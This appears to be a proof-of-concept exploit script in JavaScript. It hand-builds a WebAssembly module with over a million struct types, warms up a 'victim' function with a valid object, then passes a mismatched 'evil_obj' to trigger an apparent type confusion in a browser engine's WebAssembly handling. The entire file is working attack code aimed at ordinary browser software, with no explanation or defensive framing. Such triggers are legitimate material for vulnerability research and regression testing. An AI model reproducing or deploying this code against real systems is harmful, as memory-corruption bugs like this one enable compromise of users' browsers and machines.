var doit = false;
const kNumTypes = (1 << 20) + 4;
const kStructA = 0;
const kStructB = 1 << 20;
const kSigMakeA = kStructB + 1;
const kSigMakeB = kStructB + 2;
const kSigVictim = kStructB + 3;

function leb(n) {
    const bytes = [];
    do {
        let byte = n & 0x7f;
        n >>>= 7;
        if (n !== 0) byte |= 0x80;
        bytes.push(byte);
    } while (n !== 0);
    return bytes;
}

function str(s) {
    const bytes = s.split('').map(c => c.charCodeAt(0));
    return [bytes.length, ...bytes];
}

const types = [
    0x4e,
    ...leb(kNumTypes),

    0x5f, 0x01, 0x7e, 0x00,
];

for (let i = 0; i < (1 << 20) - 1; ++i) {
    types.push(0x5f, 0x00);
}

types.push(
    0x5f, 0x01, 0x7c, 0x00,

    0x60, 0x01, 0x7e, 0x01, 0x63, ...leb(kStructA),
    0x60, 0x01, 0x7c, 0x01, 0x63, ...leb(kStructB),
    0x60, 0x01, 0x63, ...leb(kStructB), 0x01, 0x7c,
);

const funcs = [
    3,
    ...leb(kSigMakeA),
    ...leb(kSigMakeB),
    ...leb(kSigVictim),
];

const make_a_code = [0x04, 0x00, 0x20, 0x00, 0xfb, 0x05, ...leb(kStructA), 0x0b];
const make_b_code = [0x04, 0x00, 0x20, 0x00, 0xfb, 0x05, ...leb(kStructB), 0x0b];
const victim_code = [0x05, 0x00, 0x20, 0x00, 0xfb, 0x03, ...leb(kStructB), 0x00, 0x0b];

const exports = [
    3,
    ...str("make_a"), 0x00, 0x00,
    ...str("make_b"), 0x00, 0x01,
    ...str("victim"), 0x00, 0x02,
];

const code = [
    3,
    ...leb(make_a_code.length), ...make_a_code,
    ...leb(make_b_code.length), ...make_b_code,
    ...leb(victim_code.length), ...victim_code,
];

const sections = [
    [1, ...leb(types.length), ...types],
    [3, ...leb(funcs.length), ...funcs],
    [7, ...leb(exports.length), ...exports],
    [10, ...leb(code.length), ...code],
];

const wasm_bytes = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];
for (const section of sections) {
    wasm_bytes.push(section[0], ...section.slice(1));
}

const wasm_buffer = new Uint8Array(wasm_bytes);
const wasm_module = new WebAssembly.Module(wasm_buffer);
const instance = new WebAssembly.Instance(wasm_module, {});

const make_a = instance.exports.make_a;
const make_b = instance.exports.make_b;
const victim = instance.exports.victim;

const good_obj = make_b(1.1);
const evil_obj = make_a(0x1234567812345678n);

for (let i = 0; i < 25000; i++) {
    if (i === 24999) {
        doit = true;
    }
    let obj = doit ? evil_obj : good_obj;
    victim(obj);
}